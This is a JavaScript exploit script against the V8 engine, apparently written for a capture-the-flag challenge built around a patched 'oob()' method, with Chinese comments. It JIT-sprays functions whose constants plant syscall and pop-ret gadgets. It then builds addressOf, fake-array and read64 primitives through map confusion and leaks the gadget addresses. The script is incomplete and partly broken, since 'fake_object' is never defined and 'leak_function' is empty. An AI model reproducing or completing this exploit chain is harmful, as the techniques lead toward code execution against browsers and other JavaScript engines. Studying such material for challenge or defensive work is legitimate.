function f0f05(var1, var2, var3, var4){
	var a0 = var1 ^ 0x111;
	var a1 = var1 ^ 0x112;
	var a2 = var1 ^ 0x113;
	a0 += a1 + 0x05;
	return a2 | a0;
}

function f58c3(var1, var2, var3, var4){
    var a0 = var1 ^ 0x111;
    var a1 = var1 ^ 0x112;
    var a2 = var1 ^ 0x113;
	var t0 = var1 & 0x114;
	var t1 = var1 + 0x115;
	var t2 = var1 * 0x116;
	var t3 = var1 ^ 0x117;
	var t4 = var1 & 0x118;
	var t5 = var1 + 0x119;
	var s = t4 + t0 * 2 + 0xc3;
    return a0 | a1 + a2 | t0 + t1 + t2 + t3 + t4 + t5 | s;
}

function f5ac3(var1, var2, var3, var4){    
    var a0 = var1 ^ 0x111;
    var a1 = var1 ^ 0x112;
    var a2 = var1 ^ 0x113;
	var t0 = var1 & 0x114;
	var t1 = var1 + 0x115;
	var t2 = var1 * 0x116;
	var s = a1 + a2 * 2 + 0xc3;
    return a0 | a1 + a2 |t0 + t1 + t2 | s;
}

function f5ec3(var1, var2, var3, var4){    
    var a0 = var1 ^ 0x111;
    var a1 = var1 ^ 0x112;
    var a2 = var1 ^ 0x113;
	var t0 = var1 & 0x114;
	var t1 = var1 * 0x115;
	var t2 = var1 & 0x116;
	var t3 = var1 * 0x117;
	var t4 = var1 & 0x118;
	var t5 = var1 * 0x119;
	var t6 = var1 & 0x120;
	var t7 = var1 * 0x121;
	var t8 = var1 & 0x122;
	var t9 = var1 * 0x123;
	var t10 = var1 & 0x124;
	var t11 = var1 * 0x125;
	var t12 = var1 & 0x126;
	var t13 = var1 * 0x127;
	var t14 = var1 & 0x128;
	var t15 = var1 * 0x129;
	var s = t0*2 + t2 + 0xc3;
    return a0 | a1 + a2 |t0 + t1 + t2 + t3 + t4 + t5 + t6 + t7 + t8 + t9 + t10 + t11 + t12 + t13 + t14 + t15 | s;
}

function f5fc3(var1, var2, var3, var4){
    var a0 = var1 ^ 0x111;
    var a1 = var1 ^ 0x112;
    var a2 = var1 ^ 0x113;
	var t0 = var1 & 0x114;
	var t1 = var1 + 0x115;
	var t2 = var1 * 0x116;
	var t3 = var1 ^ 0x117;
	var t4 = var1 & 0x118;
	var t5 = var1 + 0x119;
	var s = t3 + t0 * 2 + 0xc3;
    return a0 | a1 + a2 | t0 + t1 + t2 + t3 + t4 + t5 | s;
}

function jsc(var1, var2, var3, var4) {
	for (var i = 0; i < 0x10000; i++) {
		f5fc3(var1, var2, var3, var4);
		f0f05(var1, var2, var3, var4);
		f58c3(var1, var2, var3, var4);
		f5ac3(var1, var2, var3, var4);
		f5ec3(var1, var2, var3, var4);
	}
}


function sleep(n) {
	var start = new Date().getTime();
	//  console.log('休眠前：' + start);
	while (true) {
		if (new Date().getTime() - start > n) {
			break;
		}
	}
}

// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
// 浮点数转换为64位无符号整数

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64位无符号整数转为浮点数
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];
var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();
var fake_array = [
	float_array_map,
	i2f(0n),
	i2f(0x41414141n),
	i2f(0x1000000000n),
	1.1,
	2.2
];

function read64(addr)
{
	fake_array[2] = i2f(addr + 0x1n - 0x10n);// 传入地址+1变成指针，因为elements属性前面还有map和length占0x10个字节，所以要先扣除
	var leak_info = f2i(fake_object[0]);
	console.log("[*] leak addr: 0x" + hex(addr) + " data: 0x" + hex(leak_info));
	return leak_info;
}

function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    obj_array.oob(float_array_map);
	var ret = f2i(obj_array[0]);
	obj_array.oob(obj_array_map);
	return ret - 1n;
}

function leak_function(addr)
{

}

jsc(0xc35, 0xc22, 0xc32, 0xc55);

console.log("[*] leak gadget 0f05 addr: 0x" + hex(addressOf(f0f05)));
%DebugPrint(f0f05);
console.log("[*] leak gadget 5ac3 addr: 0x" + hex(addressOf(f5ac3)));
console.log("[*] leak gadget 5ec3 addr: 0x" + hex(addressOf(f5ec3)));
console.log("[*] leak gadget 5fc3 addr: 0x" + hex(addressOf(f5fc3)));
console.log("[*] leak gadget 58c3 addr: 0x" + hex(addressOf(f58c3)));

sleep(2e20);
console.log('hello world');